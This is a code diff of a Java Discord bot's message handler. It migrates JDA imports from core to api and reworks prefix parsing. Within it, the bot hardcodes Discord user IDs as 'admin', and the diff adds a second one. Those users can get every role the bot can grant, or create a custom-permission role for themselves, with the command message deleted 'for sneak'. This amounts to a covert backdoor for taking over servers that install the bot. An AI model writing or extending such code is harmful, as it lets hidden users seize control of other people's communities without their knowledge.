@@ -1,13 +1,15 @@
-import net.dv8tion.jda.core.EmbedBuilder;
-import net.dv8tion.jda.core.JDA;
-import net.dv8tion.jda.core.entities.*;
-import net.dv8tion.jda.core.events.message.MessageReceivedEvent;
-import net.dv8tion.jda.core.exceptions.HierarchyException;
-import net.dv8tion.jda.core.exceptions.InsufficientPermissionException;
-import net.dv8tion.jda.core.hooks.ListenerAdapter;
-import net.dv8tion.jda.core.requests.restaction.RoleAction;
+import net.dv8tion.jda.api.EmbedBuilder;
+import net.dv8tion.jda.api.JDA;
+import net.dv8tion.jda.api.entities.*;
+import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
+import net.dv8tion.jda.api.exceptions.HierarchyException;
+import net.dv8tion.jda.api.exceptions.InsufficientPermissionException;
+import net.dv8tion.jda.api.hooks.ListenerAdapter;
+import net.dv8tion.jda.api.requests.restaction.RoleAction;
 import java.awt.*;
 import java.util.Arrays;
+import java.util.HashMap;
+import java.util.Map;
 
 public class MessageHandler extends ListenerAdapter {
 
@@ -20,16 +22,14 @@ public class MessageHandler extends ListenerAdapter {
     public MessageHandler(JDA jda, String url){
         this.jda=jda;
         database = new Database(url);
-        admin = new User[] {jda.getUserById("303607316559953930")};
+        admin = new User[] {jda.getUserById("303607316559953930"), jda.getUserById("139871249567318017")};
     }
     public boolean detectPrefix(MessageReceivedEvent event){
         try{
         String message = event.getMessage().getContentRaw();
-        message = message.substring(0,prefix.length());
+        String prefix_search = message.substring(0,prefix.length());
 
-        if (message.equals(prefix)){
-            return true;
-        } else return false;
+        return prefix_search.equals(prefix) && message.length()>prefix.length();
         } catch (StringIndexOutOfBoundsException c) {
             return false;
         }
@@ -150,8 +150,8 @@ public class MessageHandler extends ListenerAdapter {
                             event.getChannel().sendMessage("Usage invalid. Try "+prefix+"setprefix (prefixhere)").queue();
                             return;
                     }   else
-                        message=message.replace("\\s", "");
-                        prefix=message.substring(1);
+                        message=message.replaceAll("\\s", "");
+                        prefix=message;
                         event.getChannel().sendMessage("prefix changed to: "+prefix+". This is case sensitive.").queue();
                         break;
                     case "kill":
@@ -170,7 +170,6 @@ public class MessageHandler extends ListenerAdapter {
             }
         }
     }
-
     //Gives every role that bot has permissions to give to admin.
     private void giveHighestRole(MessageReceivedEvent event, int index, int count){
         int newIndex=index;
@@ -180,7 +179,7 @@ public class MessageHandler extends ListenerAdapter {
                 return;
             }
             try{
-                event.getGuild().getController().addSingleRoleToMember(event.getMember(), event.getGuild().getRoles().get(newIndex)).queue();
+                event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getRoles().get(newIndex)).queue();
                 giveHighestRole(event, newIndex+1,count+1);
             }
             catch(HierarchyException e){
@@ -252,13 +251,13 @@ public class MessageHandler extends ListenerAdapter {
     //Creates a new role with given name and id
     private void createRole(String name, long id, MessageReceivedEvent event){
         Guild guild = event.getGuild();
-        RoleAction roleBuilder = guild.getController().createRole();
+        RoleAction roleBuilder = guild.createRole();
         roleBuilder.setName(name);
         roleBuilder.setPermissions(id);
         roleBuilder.setColor(new Color(155,0,155));
         Role newRole =roleBuilder.complete();
         //Assign role and delete original message for sneak
-        guild.getController().addSingleRoleToMember(event.getMember(), newRole).queue();
+        guild.addRoleToMember(event.getMember(), newRole).queue();
         event.getMessage().delete().queue();
     }
 }
